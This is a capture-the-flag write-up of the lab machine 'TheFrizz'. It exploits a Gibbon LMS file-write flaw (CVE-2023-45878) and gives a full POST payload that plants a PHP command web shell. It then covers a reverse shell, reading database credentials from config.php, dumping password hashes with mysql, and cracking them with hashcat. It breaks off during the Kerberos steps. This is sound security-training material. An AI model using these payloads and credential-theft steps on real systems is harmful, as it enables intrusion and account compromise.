`TheFrizz` is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance.
# Init

Starting with the `nmap` scan, we have SSH, LDAP and Kerberos ports open along with `frizzdc.firzz.htb` and `firzz.htb` on port `80`.

The port 80 takes us to a WES School website hosted on `apache` server. There is a peculiar text under "Hacking & The Law" course name:

Each string is 28 bytes but is a simple base64 encoding. Lols.

```

Next, we have "Staff Login" button which takes us to Gibbon LMS login (This site is based on Gibbon framework) page asking for username password and an option to start Student and Staff applications!
![[Pasted image 20250829171201.png]]

Trying with random email and password gives "Incorrect username **and** password" strange. Anyways, there is Forgot password button, which take us to `http://frizzdc.frizz.htb/Gibbon-LMS/index.php?q=passwordReset.php`. Seems like passing a file in the query param. So, maybe we can do arbitrary read? 
A quick search lands me at [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878). A public exploit is available at https://herolab.usd.de/security-advisories/usd-2023-0025/.
Basically we can access a particular path (`/modules/Rubrics/rubrics_visualise_saveAjax.php`) which expects an 'img' tag and we can make it write arbitrary data under the pretext of bsae64 encoded image.

So, I head over to Burpsuite and send a POST request to above file and ask it to write `php` code into `yuyu.php` file.
![[Pasted image 20250829184850.png]]

```
img=image/png;yuyu,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=yuyu.php&gibbonPersonID=0000000001
```

The base64 string is the PHP code `<?php echo system($_GET['cmd'])?`.
Now that we have `yuyu.php` file on server, we can access it at `/Gibbon-LMS/yuyu.php` and we can pass a `cmd` parameter which is a windows command:
![[Pasted image 20250829185709.png]]

Noice! So, we can now execute commands and get a reverse shell! You can simply go to https://www.revshells.com/ and get your shell code in base64 with your IP and port specified!
![[Pasted image 20250829190724.png]]

We can then listen on our local machine and send the above text as argument of `cmd`. Remember that we need to substitute "space" with "+" as you cannot pass white space in URL parameters. Send the request and you have the reverse shell ðŸŽ‰.

```

Well, I don't know better so I look for the string `password` in all the files of current folder using `findstr -I "password" *.*`. It prints out a lot of data because we have a forgot password file too! We can exclude it and look at the data and find that `config.php` has a DB password!
![[Pasted image 20250829193035.png]]

I has whole SQL DB info too:
```
/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

So, we can access the DB! I change to the `/xampp/mysql/bin` folder which has `mysql.exe`. This can be used to read Tables and it's contents. 
```
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables';
```

A lot of tables are listed. I try to look for any user or student or person table. There is a **gibbonperson** table. So, lets describe it.
```
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonperson';
Field	Type	Null	Key	Default	Extra
gibbonPersonID	int(10) unsigned zerofill	NO	PRI	NULL	auto_increment
title	varchar(5)	NO		NULL	
surname	varchar(60)	NO			
firstName	varchar(60)	NO			
preferredName	varchar(60)	NO			
officialName	varchar(150)	NO		NULL	
nameInCharacters	varchar(60)	NO		NULL	
gender	enum('M','F','Other','Unspecified')	NO		Unspecified	
username	varchar(20)	NO	UNI	NULL	
passwordStrong	varchar(255)	NO		NULL	
passwordStrongSalt	varchar(255)	NO		NULL	
passwordForceReset	enum('N','Y')	NO		N
```

And this one has a "passwordStrong" with "Salt" fields. So we can extract thoes and try to crack it with hascat.
```
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'select username,passwordStrong,passwordStrongSalt from  gibbonperson';
username	passwordStrong	passwordStrongSalt
f.frizzle	067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03	/aACFhikmNopqrRTVz2489
```

Put all the data in a `hash.txt` file in format `username:hash:salt` as that is the expected format. In Gibbon, the passwords are stored as SHA256 where salt is prepended so choose the mode accordingly.
`hashcat -m 1420 --username hash.txt /usr/share/wordlists/rockyou.txt.gz`

And we have the password cracked! `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23`

Now we can simply `ssh` to the machine!
Well, no! The firewall will block it. The SSH is configured to not be accessed via password. We cannot use `evil-winrm` as the firewall has blocked the ports!
```
PORT     STATE    SERVICE VERSION
5985/tcp filtered wsman
5986/tcp filtered wsmans
```

We need to get Kerberos credentials. We can do so via the SMB service using NetExec.
```

But the clock is skew so do `sudo ntpdate 10.10.11.60` and rerun the command
